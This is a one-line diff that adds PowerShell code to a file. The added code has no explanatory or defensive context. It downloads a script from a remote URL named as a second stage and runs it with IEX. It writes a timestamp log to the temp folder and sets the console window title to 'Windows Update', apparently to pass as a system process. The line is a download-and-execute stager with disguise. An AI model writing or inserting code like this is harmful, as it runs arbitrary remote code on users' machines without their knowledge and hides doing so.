@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage1Url = "http://internal.corp/stage2.ps1"; $RemoteScript = (New-Object System.Net.WebClient).DownloadString($Stage1Url); IEX $RemoteScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $Host.UI.RawUI.WindowTitle = "Windows Update"
